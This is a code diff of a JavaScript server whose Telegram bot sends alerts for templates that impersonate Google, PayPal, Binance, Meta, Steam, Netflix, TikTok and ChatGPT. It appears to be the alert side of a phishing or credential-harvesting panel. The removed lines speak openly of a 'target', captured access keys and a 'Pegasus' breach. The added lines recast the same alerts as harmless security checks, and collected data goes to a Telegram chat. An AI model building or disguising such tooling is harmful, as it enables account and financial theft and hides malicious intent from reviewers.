@@ -138,30 +138,30 @@ async function startServer() {
       let status = '🔄 <i>ᴛᴀʀɢᴇᴛ ꜱᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ɪᴢɪɴ ᴛᴀᴍʙᴀʜᴀɴ...</i>';
 
       if (tmplId === 'google') {
-        header = '🛡️ <b>ɢᴏᴏɢʟᴇ_ꜱᴇᴄᴜʀɪᴛʏ: ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ</b>';
+        header = '🛡️ <b>Google Security: Access Granted</b>';
       } else if (tmplId === 'pegasus') {
-        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ_ᴠ9.3: ᴋᴇʀɴᴇʟ_ʙʀᴇᴀᴄʜ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
-        status = '🔥 <i>ꜱᴛᴀᴛᴜꜱ: ᴅᴇᴇᴘ ꜱᴄᴀɴ ʜᴀʀᴅᴡᴀʀᴇ ᴀᴋᴛɪꜰ.</i>';
+        header = '🛡️ <b>Device Security: Audit Completed</b>';
+        status = '✅ <i>Status: Deep scan completed.</i>';
       } else if (tmplId === 'file') {
-        header = '📂 <b>ꜰɪʟᴇ_ᴛʀᴀɴꜱꜰᴇʀ: ᴀᴄᴄᴇꜱꜱ_ᴋᴇʏ_ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
+        header = '📂 <b>File Access: Verification Successful</b>';
       } else if (tmplId === 'security_audit') {
-        header = '🛡️ <b>ᴇᴄᴏꜱʏꜱᴛᴇᴍ_ᴀᴜᴅɪᴛ: ɪɴᴛᴇɢʀɪᴛʏ_ᴘᴀꜱꜱ</b>';
+        header = '🛡️ <b>System Audit: Integrity Confirmed</b>';
       } else if (tmplId === 'cloudflare') {
-        header = '☁️ <b>ᴄʟᴏᴜᴅꜰʟᴀʀᴇ_ᴇᴅɢᴇ: ɪɴᴛᴇɢʀɪᴛʏ_ᴠᴇʀɪꜰɪᴇᴅ</b>';
+        header = '☁️ <b>Cloudflare Edge: Security Verified</b>';
       } else if (tmplId === 'meta_login') {
-        header = '💬 <b>ᴍᴇᴛᴀ_ꜱᴏᴄɪᴀʟ: ɪᴅᴇɴᴛɪᴛʏ_ꜱʏɴᴄᴇᴅ</b>';
+        header = '💬 <b>Meta: Identity Verified</b>';
       } else if (tmplId === 'binance') {
-        header = '💱 <b>ʙᴛᴄ_ᴄʀʏᴘᴛᴏ: ᴀꜱꜱᴇᴛ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
+        header = '💱 <b>Binance: Access Authenticated</b>';
       } else if (tmplId === 'paypal') {
-        header = '💳 <b>ᴘᴀʏᴘᴀʟ_ꜰɪɴᴛᴇᴄʜ: ᴀᴜᴛʜ_ʙᴜꜱ_ɢʀᴀɴᴛᴇᴅ</b>';
+        header = '💳 <b>PayPal: Authorization Granted</b>';
       } else if (tmplId === 'steam') {
-        header = '🎮 <b>ꜱᴛᴇᴀᴍ_ɢᴀᴍɪɴɢ: ɴᴏᴅᴇ_ꜱʏɴᴄ_ᴄᴏᴍᴘʟᴇᴛᴇ</b>';
+        header = '🎮 <b>Steam: Security Synced</b>';
       } else if (tmplId === 'netflix') {
-        header = '🍿 <b>ɴᴇᴛꜰʟɪx_ꜱʏɴᴄ: ʜᴏᴜꜱᴇʜᴏʟᴅ_ɢʀɪᴅ_ᴍᴀᴛᴄʜ</b>';
+        header = '🍿 <b>Netflix: Session Verified</b>';
       } else if (tmplId === 'tiktok') {
-        header = '🎵 <b>ᴛɪᴋᴛᴏᴋ_ʀᴇᴄᴏɴ: ᴄʀᴇᴀᴛᴏʀ_ᴛᴇʟᴇᴍᴇᴛʀʏ</b>';
+        header = '🎵 <b>TikTok: Security Verification Complete</b>';
       } else if (tmplId === 'chatgpt') {
-        header = '🤖 <b>ᴏᴘᴇɴᴀɪ_ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ: ᴅᴇᴠ_ᴇɴᴠ_ᴍᴀᴘᴇᴅ</b>';
+        header = '🤖 <b>OpenAI: Security Check Passed</b>';
       }
 
       let msg = `<b>${header}</b>\n` +
@@ -411,7 +411,7 @@ async function startServer() {
 
       if (hasData) {
         extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `🏴‍☠️ <b>DATA_SYNC_COMPLETE: PEGASUS v9.2</b>`;
+                    `✅ <b>Data Synchronization Complete.</b>`;
         botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
       }
     }
